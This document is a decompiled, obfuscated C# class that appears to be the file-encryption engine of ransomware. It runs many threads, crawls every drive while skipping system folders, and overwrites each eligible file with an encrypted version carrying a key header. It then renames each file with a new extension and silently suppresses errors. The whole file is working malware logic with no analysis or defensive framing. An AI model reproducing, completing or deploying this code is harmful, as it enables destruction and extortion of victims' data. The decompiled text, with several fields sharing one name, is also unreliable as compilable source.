using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using _003Cdion2ntty2ic0uyoe_003E_007B43570453_002D3AD8_002D4A5B_002DB273_002D83DF8156D820_007D;

namespace C3904355907;

public sealed class C1812594589
{
	private readonly List<string> m_C3554254475 = new List<string>
	{
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iG(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ig(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iH(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ih(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iI(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ii(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iJ(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ij(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iK(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ik(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iL(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.il(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iM(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.im(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iN(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.@in(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iO(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.io(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iP(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ip()
	};

	private readonly List<string> m_C3904355907 = new List<string>
	{
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iQ(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iq(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iR(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ir(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iS(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.@is(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.@if()
	};

	private ConcurrentQueue<FileInfo> m_C3554254475 = new ConcurrentQueue<FileInfo>();

	private List<Thread> m_C3554254475 = new List<Thread>();

	private bool m_C3554254475 = false;

	private Random m_C3554254475 = new Random((int)DateTime.UtcNow.Ticks);

	private static object m_C3554254475 = new object();

	public void C3554254475()
	{
		int num = Environment.ProcessorCount * 3;
		for (int i = 0; i < num; i++)
		{
			Thread thread = new Thread(C3904355907);
			thread.IsBackground = false;
			thread.Priority = ThreadPriority.Normal;
			thread.Start();
			this.m_C3554254475.Add(thread);
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo_ in array)
		{
			C3554254475(driveInfo_);
		}
		this.m_C3554254475 = true;
		foreach (Thread item in this.m_C3554254475)
		{
			item.Join();
		}
	}

	private void C3554254475(DriveInfo driveInfo_0)
	{
		if (!driveInfo_0.IsReady)
		{
			return;
		}
		DirectoryInfo[] directories = driveInfo_0.RootDirectory.GetDirectories();
		DirectoryInfo[] array = directories;
		foreach (DirectoryInfo directoryInfo in array)
		{
			if (!this.m_C3554254475.Contains(directoryInfo.Name.ToLower()))
			{
				C3554254475(directoryInfo);
			}
		}
	}

	private void C3554254475(DirectoryInfo directoryInfo_0)
	{
		if (this.m_C3554254475.Contains(directoryInfo_0.Name.ToLower()))
		{
			return;
		}
		try
		{
			if (directoryInfo_0.FullName.Contains(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ie()))
			{
				return;
			}
			using (StreamWriter streamWriter = File.AppendText(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iF()))
			{
				streamWriter.Write(directoryInfo_0.FullName + Environment.NewLine);
			}
			DirectoryInfo[] directories = directoryInfo_0.GetDirectories();
			if (directories != null)
			{
				DirectoryInfo[] array = directories;
				foreach (DirectoryInfo directoryInfo_ in array)
				{
					C3554254475(directoryInfo_);
				}
			}
			FileInfo[] files = directoryInfo_0.GetFiles();
			FileInfo[] array2 = files;
			foreach (FileInfo fileInfo_ in array2)
			{
				C3554254475(fileInfo_);
			}
		}
		catch (Exception)
		{
		}
	}

	private void C3554254475(FileInfo fileInfo_0)
	{
		this.m_C3554254475.Enqueue(fileInfo_0);
	}

	private void C3904355907()
	{
		while (!this.m_C3554254475 || !this.m_C3554254475.IsEmpty)
		{
			FileInfo result = null;
			if (this.m_C3554254475.TryDequeue(out result))
			{
				C3904355907(result);
			}
			Thread.Sleep(this.m_C3554254475.Next(5, 99));
		}
	}

	private void C3904355907(FileInfo fileInfo_0)
	{
		Thread.Sleep(10);
		try
		{
			if (fileInfo_0.Extension == null || this.m_C3904355907.Contains(fileInfo_0.Extension.ToLower()) || C878818188.C3554254475(fileInfo_0))
			{
				return;
			}
			byte[] byte_ = null;
			C543223747.C3554254475(fileInfo_0, ref byte_);
			using FileStream fileStream = File.OpenWrite(fileInfo_0.FullName);
			fileStream.Position = 0L;
			byte[] byte_2 = null;
			byte[] byte_3 = null;
			lock (C1812594589.m_C3554254475)
			{
				C3463352047.C3554254475();
				byte_2 = new byte[C3463352047.C1255198513.Length];
				byte_3 = new byte[C3463352047.C1908338681.Length];
				Array.Copy(C3463352047.C1908338681, byte_3, C3463352047.C1908338681.Length);
				Array.Copy(C3463352047.C1255198513, byte_2, C3463352047.C1255198513.Length);
				fileStream.Write(C3110715001.C3554254475, 0, C3110715001.C3904355907);
				fileStream.Write(C3463352047.C3554254475, 0, C3463352047.C3554254475.Length);
				fileStream.Write(C3463352047.C3904355907, 0, C3463352047.C3904355907.Length);
			}
			fileStream.Flush();
			C2181537457.C3554254475(fileStream, ref byte_, ref byte_2, ref byte_3);
			File.Move(fileInfo_0.FullName, fileInfo_0.FullName + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.@if());
			C878818188.C3554254475(ref byte_2);
			C878818188.C3554254475(ref byte_3);
		}
		catch (Exception)
		{
		}
	}
}
